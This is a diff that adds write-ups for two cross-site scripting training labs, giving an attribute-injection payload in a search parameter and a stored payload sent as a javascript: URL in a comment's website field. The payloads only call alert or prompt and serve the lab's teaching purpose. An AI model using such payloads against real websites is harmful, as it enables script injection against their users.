@@ -102,3 +102,45 @@ Hello, world!
 ```
 
 View to confirm the payload launches (makes the view print in a loop). Then send to victim to solve the lab.
+
+
+# Lab 7
+
+## Description
+
+This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.
+
+ ####  Hint
+
+Just because you're able to trigger the `alert()` yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.
+
+## Solution
+
+Insert following payload into search param:
+
+```
+/?search=test"onmouseover="alert(1)
+```
+
+Tried `onload` instead of `onmouseover` but it didn't trigger.
+
+
+# Lab 8
+
+## Description
+
+This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.
+
+## Solution
+
+Write a comment on a blog post with the XSS payload inside the tag `website=` :
+
+```
+POST /post/comment HTTP/2
+[...]
+
+csrf=tlmKV3oBPeXwVbY9xnYqJHTgMMnELbLn&postId=3&comment=test&name=test&email=test%40test.com&website=javascript%3Aprompt%28%22XSS%22%29
+```
+
+The XSS triggers on visiting the link (located on the commenter's name).
+
